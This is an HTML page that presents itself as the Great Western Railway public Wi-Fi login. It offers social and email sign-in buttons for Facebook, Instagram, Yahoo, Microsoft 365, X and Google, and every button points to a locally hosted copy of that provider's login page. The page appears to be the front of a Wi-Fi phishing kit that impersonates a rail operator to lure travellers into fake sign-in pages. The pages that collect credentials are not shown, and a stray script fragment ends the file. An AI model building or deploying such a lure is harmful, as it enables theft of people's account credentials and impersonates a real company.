<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Portal</title>

    <link rel="stylesheet" href="all-tailwind-classes-full.css">
<!--    <link rel="stylesheet" href="all-tailwind-classes-full-min.css"> -->
    <style>
        .login-btn {
            transition: all 0.3s ease;
        }
        .login-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
        }
        .login-btn:active {
            transform: translateY(-2px);
        }
        .portal-overlay {
            background-color: rgba(0, 60, 30, 0.85);
        }
    </style>
</head>
<body class="min-h-screen bg-cover bg-center" style="background-image: url('bg-main.jpg');">
    <div class="portal-overlay absolute inset-0 flex items-center justify-center">
        <div class="container mx-auto px-4 py-12">
            <div class="max-w-2xl mx-auto bg-green bg-opacity-10 backdrop-blur-md rounded-xl p-8 shadow-2xl">
		<div class="flex justify-center mb-8"><img src="icon.jpg" alt="GWR Supports Pride!" class="h-16 object-contain">
		</div>
                <h1 class="text-3xl md:text-4xl font-bold text-white text-center mb-12">Welcome to Great Western Railway Public Wi-Fi Service</h1>
                
                <div class="space-y-8">
                    <!-- Row 1 -->
                    <div class="flex flex-col md:flex-row justify-center gap-6">
                        <a href="login/websites/facebook/index.html" class="login-btn flex-1 bg-transparent hover:bg-transparent text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center">
                            <img src="buttons/facebook_up.jpg" 
                                 class="h-12 w-full object-contain"
                                 onmouseover="this.src='buttons/facebook_down.jpg'"
                                 onmouseout="this.src='buttons/facebook_up.jpg'"
                                 onclick="this.src='buttons/facebook_down.jpg'">
                        </a>
                        <a href="login/websites/instagram/index.html" class="login-btn flex-1 bg-transparent hover:bg-transparent text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center">
                            <img src="buttons/insta_up.jpg" 
                                 class="h-12 w-full object-contain"
                                 onmouseover="this.src='buttons/insta_down.jpg'"
                                 onmouseout="this.src='buttons/insta_up.jpg'"
                                 onclick="this.src='buttons/insta_down.jpg'">
                        </a>
                    </div>
                    
                    <!-- Row 2 -->
                    <div class="flex flex-col md:flex-row justify-center gap-6">
                        <a href="login/websites/yahoo/index.html" class="login-btn flex-1 bg-transparent hover:bg-transparent text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center">
                            <img src="buttons/yahoo_up.jpg" 
                                 class="h-12 w-full object-contain"
                                 onmouseover="this.src='buttons/yahoo_down.jpg'"
                                 onmouseout="this.src='buttons/yahoo_up.jpg'"
                                 onclick="this.src='buttons/yahoo_down.jpg'">
                        </a>
                        <a href="login/websites/m365/index.html" class="login-btn flex-1 bg-transparent hover:bg-transparent text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center">
                            <img src="buttons/microsoft_up.png" 
                                 class="h-12 w-full object-contain"
                                 onmouseover="this.src='buttons/microsoft_down.png'"
                                 onmouseout="this.src='buttons/microsoft_up.png'"
                                 onclick="this.src='buttons/microsoft_down.png'">
                        </a>
                    </div>
                    
                    <!-- Row 3 -->
                    <div class="flex flex-col md:flex-row justify-center gap-6">
                        <a href="login/websites/x/index.html" class="login-btn flex-1 bg-transparent hover:bg-transparent text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center">
                            <img src="buttons/twitter_up.jpg" 
                                 class="h-12 w-full object-contain"
                                 onmouseover="this.src='buttons/twitter_down.jpg'"
                                 onmouseout="this.src='buttons/twitter_up.jpg'"
                                 onclick="this.src='buttons/twitter_down.jpg'">
                        </a>
                        <a href="login/websites/google/index.html" class="login-btn flex-1 bg-transparent hover:bg-transparent text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center">
                            <img src="buttons/google_up.jpg" 
                                 class="h-12 w-full object-contain"
                                 onmouseover="this.src='buttons/google_down.jpg'"
                                 onmouseout="this.src='buttons/google_up.jpg'"
                                 onclick="this.src='buttons/google_down.jpg'">
                        </a>
                    </div>
                </div>
                
                <p class="text-white text-opacity-70 text-center mt-12 text-sm">
                    By logging in, you agree to our Terms of Service and Privacy Policy
                </p>
            </div>
        </div>
    </div>

        feather.replace();
    </script>
